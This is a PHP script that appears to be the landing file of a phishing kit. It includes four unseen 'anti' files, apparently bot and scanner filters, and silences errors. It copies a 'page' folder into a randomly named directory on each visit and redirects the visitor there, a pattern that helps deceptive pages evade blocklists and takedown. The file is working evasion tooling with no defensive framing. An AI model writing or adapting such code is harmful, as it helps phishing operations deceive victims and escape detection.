<?php
	
	@error_reporting();

	require 'anti/anti1.php';
	require 'anti/anti2.php';
	require 'anti/anti3.php';
	require 'anti/anti4.php';

	function genString() {
	    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $randomString = '';
	    for ($i = 0; $i < 5; $i++) {
	        $randomString .= $characters[rand(0, strlen($characters) - 1)];
	    }
	    return $randomString;
	}

	$to = genString();

	function reCopy($origin, $place) {
		$dir = opendir($origin);
		$result = ($dir === false ? false : true);
		if ($result !== false) {
			$result = @mkdir($place);
			if ($result === true) {
				while(false !== ( $file = readdir($dir)) ) { 
					if (( $file != '.' ) && ( $file != '..' ) && $result) { 
						if ( is_dir($origin . '/' . $file) ) { 
							$result = reCopy($origin . '/' . $file,$place . '/' . $file); 
						} else { 
							$result = copy($origin . '/' . $file,$place . '/' . $file); 
						} 
					} 
				}
				closedir($dir);
			}
		}
		return $result;
	}

	reCopy( "page", $to );
	header("Location: {$to}");
	exit();

?>